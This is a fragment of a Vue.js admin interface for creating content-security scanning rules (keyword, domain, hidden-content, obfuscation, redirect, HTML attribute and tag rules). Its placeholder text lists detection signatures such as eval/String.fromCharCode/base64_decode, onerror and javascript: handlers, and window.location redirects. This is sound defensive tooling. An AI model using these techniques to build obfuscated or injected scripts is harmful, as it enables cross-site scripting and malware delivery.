            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordCreateForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordCreateForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordRule ? 'Creating...' : 'Create Keyword Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Domain Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'domain' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Domain -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Domain <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="domainCreateForm.domain"
            type="text" 
            placeholder="e.g. malicious-site.com, shady-tracker.org"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="GAMBLING">Gambling</option>
              <option value="MALWARE">Malware</option>
              <option value="PHISHING">Phishing</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainCreateForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="EXACT">Exact Domain</option>
              <option value="SUBDOMAIN">Domain And Subdomains</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="domainCreateForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="domainCreateForm.description"
            rows="2"
            placeholder="Explain why this domain is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="domainCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingDomainRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingDomainRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingDomainRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingDomainRule ? 'Creating...' : 'Create Domain Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Hidden Content Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'hidden_content' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- CSS Declaration / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            CSS Declaration / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="hiddenContentCreateForm.pattern"
            type="text" 
            placeholder="e.g. display:none, opacity:0, font-size:0, visibility:hidden"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="INJECTION">Injection</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="hiddenContentCreateForm.description"
            rows="2"
            placeholder="Explain why this hidden content pattern is flagged or prohibited..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="hiddenContentCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHiddenContentRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHiddenContentRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingHiddenContentRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHiddenContentRule ? 'Creating...' : 'Create Hidden Content Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Obfuscation Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'obfuscation' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Pattern / Regex -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Regex <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="obfuscationCreateForm.pattern"
            type="text" 
            placeholder="e.g. eval\(|String\.fromCharCode|base64_decode"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="obfuscationCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="MALWARE">Malware</option>
              <option value="INJECTION">Injection</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="REDIRECT">Redirect</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="obfuscationCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="obfuscationCreateForm.description"
            rows="2"
            placeholder="Explain why this obfuscation pattern or script signature is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="obfuscationCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingObfuscationRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingObfuscationRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingObfuscationRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingObfuscationRule ? 'Creating...' : 'Create Obfuscation Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Redirect Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'redirect' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Pattern / Heuristic -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Redirect Pattern / Heuristic <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="redirectCreateForm.pattern"
            type="text" 
            placeholder="e.g. window.location=, http-equiv=&quot;refresh&quot;, bit.ly/"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="redirectCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="REDIRECT">Redirect</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="MALWARE">Malware</option>
              <option value="PHISHING">Phishing</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="redirectCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="redirectCreateForm.description"
            rows="2"
            placeholder="Explain why this redirect pattern or URL shortener is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground font-medium">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="redirectCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingRedirectRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingRedirectRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingRedirectRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingRedirectRule ? 'Creating...' : 'Create Redirect Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- HTML Attribute Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'attribute' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Attribute -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Attribute / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="htmlAttributeCreateForm.attribute"
            type="text" 
            placeholder="e.g. onerror, onclick, onload, javascript:"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="htmlAttributeCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="INJECTION">Injection</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="htmlAttributeCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="htmlAttributeCreateForm.description"
            rows="2"
            placeholder="Explain why this HTML attribute or event handler pattern is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground font-medium">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="htmlAttributeCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHtmlAttributeRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHtmlAttributeRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingHtmlAttributeRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHtmlAttributeRule ? 'Creating...' : 'Create HTML Attribute Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- HTML Tag Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'html' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Tag -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            HTML Tag Name <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="htmlTagCreateForm.tag"
            type="text" 
            placeholder="e.g. script, iframe, object, embed, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="htmlTagCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="DANGEROUS_TAGS">Dangerous Tags</option>
              <option value="EMBEDDED_CONTENT">Embedded Content</option>
              <option value="PLUGIN_OBJECTS">Plugin Objects</option>
              <option value="DOM_HIJACKING">DOM Hijacking</option>
              <option value="INJECTION">Injection</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="htmlTagCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="htmlTagCreateForm.description"
            rows="2"
            placeholder="Explain why this HTML tag pattern is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground font-medium">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="htmlTagCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHtmlTagRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHtmlTagRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingHtmlTagRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHtmlTagRule ? 'Creating...' : 'Create HTML Tag Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Standard / Other Detection Rules Form -->
      <form v-else @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Rule Type -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Rule Type</label>
          <select 
            v-model="ruleForm.type"
            :disabled="!!editingRule"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          >
            <option value="keyword">Blacklisted Keyword / Phrase</option>
            <option value="domain">Malicious / Phishing Domain</option>
            <option value="hidden_content">Hidden Content Rule</option>
            <option value="html">Dangerous HTML Tag</option>
            <option value="attribute">Dangerous Event Attribute</option>
            <option value="redirect">Redirect Hijacking Rule</option>
          </select>
        </div>

        <!-- Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Token String <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="ruleForm.pattern"
            type="text" 
            placeholder="e.g. casino-example.com, <script>, onclick, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category</label>
            <input 
              v-model="ruleForm.category"
              type="text" 
              placeholder="e.g. Phishing, Spam, XSS"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            />
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity</label>
            <select 
              v-model="ruleForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            >
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="ruleForm.description"
            rows="2"
            placeholder="Explain why this token is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are checked during catalog scans</p>
          </div>
          <input 
            v-model="ruleForm.enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs"
          >
            {{ editingRule ? 'Save Changes' : 'Create Rule' }}
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW KEYWORD RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isView.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (selectedKeywordRule ? `Keyword Rule #${selectedKeywordRule.id}` : 'Keyword Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeKeywordViewModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedKeywordRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
